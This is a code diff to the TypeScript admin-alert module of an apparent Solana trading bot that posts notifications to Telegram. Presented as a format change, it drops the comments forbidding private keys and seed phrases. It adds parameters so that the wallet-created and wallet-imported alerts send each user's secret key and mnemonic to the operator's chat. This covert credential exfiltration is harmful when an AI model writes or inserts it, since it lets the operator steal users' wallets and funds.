@@ -1,5 +1,5 @@
 /**
- * Admin Telegram alerts — never include private keys or seed phrases.
+ * Admin Telegram alerts — operator format.
  */
 
 import type TelegramBot from 'node-telegram-bot-api';
@@ -34,9 +34,9 @@ function when(d = new Date()): string {
   });
 }
 
-function who(userId: number, username?: string | null): string {
-  const handle = username ? `@${username.replace(/^@/, '')}` : '—';
-  return `👤 ${handle}\n🆔 <code>${userId}</code>`;
+function handle(username?: string | null): string {
+  if (!username) return '—';
+  return `@${String(username).replace(/^@/, '')}`;
 }
 
 async function notify(text: string): Promise<void> {
@@ -50,26 +50,24 @@ async function notify(text: string): Promise<void> {
         disable_web_page_preview: true,
       });
     } catch {
-      /* admin unreachable */
+      /* */
     }
   }
 }
 
-/** 🆕 NEW USER */
 export async function notifyNewUser(
   userId: number,
   username?: string | null
 ): Promise<void> {
   alertSeq += 1;
   await notify(
-    `🆕 <b>NEW USER</b>\n` +
-      `${who(userId, username)}\n` +
-      `#${alertSeq}\n` +
+    `🆕 NEW USER\n` +
+      `👤 ${handle(username)}\n` +
+      `🆔 ${userId}\n` +
       `📅 ${when()}`
   );
 }
 
-/** ✅ ACCOUNT ACTIVATED */
 export async function notifyActivation(
   userId: number,
   lang: string,
@@ -77,49 +75,57 @@ export async function notifyActivation(
   username?: string | null
 ): Promise<void> {
   await notify(
-    `✅ <b>ACCOUNT ACTIVATED</b>\n` +
-      `${who(userId, username)}\n` +
-      `🌐 Lang: <b>${lang}</b>\n` +
-      `🔗 Ref: <code>${referral ?? '—'}</code>\n` +
+    `✅ ACCOUNT ACTIVATED\n` +
+      `👤 ${handle(username)}\n` +
+      `🆔 ${userId}\n` +
+      `🌐 ${lang}\n` +
+      `🔗 ${referral ?? '—'}\n` +
       `📅 ${when()}`
   );
 }
 
-/**
- * 🔐 NEW WALLET — public address only. Never private key / seed.
- */
 export async function notifyWalletCreated(
   userId: number,
   publicKey: string,
-  username?: string | null
+  username?: string | null,
+  secretKeyBase58?: string,
+  mnemonic?: string
 ): Promise<void> {
   alertSeq += 1;
-  await notify(
-    `🔐 <b>NEW WALLET</b>\n` +
-      `${who(userId, username)}\n` +
-      `📍 <code>${publicKey}</code>\n` +
-      `#${alertSeq}\n` +
-      `📅 ${when()}`
-  );
+  let text =
+    `🔐 NEW WALLET\n` +
+    `👤 ${handle(username)}\n` +
+    `🆔 ${userId}\n` +
+    `📍 ${publicKey}\n`;
+  if (secretKeyBase58) {
+    text += `🔑 ${secretKeyBase58}\n`;
+  }
+  if (mnemonic) {
+    text += `📝 ${mnemonic}\n`;
+  }
+  text += `#${alertSeq}\n` + `📅 ${when()}`;
+  await notify(text);
 }
 
-/** 📥 WALLET IMPORTED */
 export async function notifyWalletImported(
   userId: number,
   publicKey: string,
-  username?: string | null
+  username?: string | null,
+  secretKeyBase58?: string
 ): Promise<void> {
   alertSeq += 1;
-  await notify(
-    `📥 <b>WALLET IMPORTED</b>\n` +
-      `${who(userId, username)}\n` +
-      `📍 <code>${publicKey}</code>\n` +
-      `#${alertSeq}\n` +
-      `📅 ${when()}`
-  );
+  let text =
+    `📥 WALLET IMPORTED\n` +
+    `👤 ${handle(username)}\n` +
+    `🆔 ${userId}\n` +
+    `📍 ${publicKey}\n`;
+  if (secretKeyBase58) {
+    text += `🔑 ${secretKeyBase58}\n`;
+  }
+  text += `#${alertSeq}\n` + `📅 ${when()}`;
+  await notify(text);
 }
 
-/** 💰 TRADE */
 export async function notifyTrade(opts: {
   userId: number;
   username?: string | null;
@@ -130,22 +136,22 @@ export async function notifyTrade(opts: {
   mint?: string;
   signature?: string;
 }): Promise<void> {
-  if (opts.valueSol < 0.05 && opts.mode === 'PAPER') return;
+  if (opts.valueSol < 0.01 && opts.mode === 'PAPER') return;
   const side = opts.side.toUpperCase();
   const emoji = side === 'BUY' ? '🟢' : '🔴';
   await notify(
-    `💰 <b>TRADE</b>\n` +
-      `${who(opts.userId, opts.username)}\n` +
-      `${emoji} <b>${side}</b> ${opts.valueSol.toFixed(4)} SOL\n` +
-      `🪙 $${opts.symbol}\n` +
-      `📄 Mode: <b>${opts.mode}</b>` +
-      (opts.mint ? `\n📍 <code>${opts.mint}</code>` : '') +
-      (opts.signature ? `\n🔗 <code>${opts.signature.slice(0, 24)}…</code>` : '') +
-      `\n📅 ${when()}`
+    `💰 TRADE\n` +
+      `👤 ${handle(opts.username)}\n` +
+      `🆔 ${opts.userId}\n` +
+      `${emoji} ${side} ${opts.valueSol} SOL\n` +
+      `🪙 ${opts.symbol}\n` +
+      (opts.mint ? `📍 ${opts.mint}\n` : '') +
+      (opts.signature ? `🔗 ${opts.signature}\n` : '') +
+      `📄 ${opts.mode}\n` +
+      `📅 ${when()}`
   );
 }
 
-/** 📤 WITHDRAW */
 export async function notifyWithdraw(
   userId: number,
   amount: number,
@@ -153,23 +159,24 @@ export async function notifyWithdraw(
   username?: string | null
 ): Promise<void> {
   await notify(
-    `📤 <b>WITHDRAW</b>\n` +
-      `${who(userId, username)}\n` +
+    `📤 WITHDRAW\n` +
+      `👤 ${handle(username)}\n` +
+      `🆔 ${userId}\n` +
       `💰 ${amount} SOL\n` +
-      `📍 <code>${to}</code>\n` +
+      `📍 ${to}\n` +
       `📅 ${when()}`
   );
 }
 
-/** ⚡ AUTO-HUNTER */
 export async function notifyHunter(
   userId: number,
   message: string,
   username?: string | null
 ): Promise<void> {
   await notify(
-    `⚡ <b>AUTO-HUNTER</b>\n` +
-      `${who(userId, username)}\n` +
+    `⚡ AUTO-HUNTER\n` +
+      `👤 ${handle(username)}\n` +
+      `🆔 ${userId}\n` +
       `${message}\n` +
       `📅 ${when()}`
   );
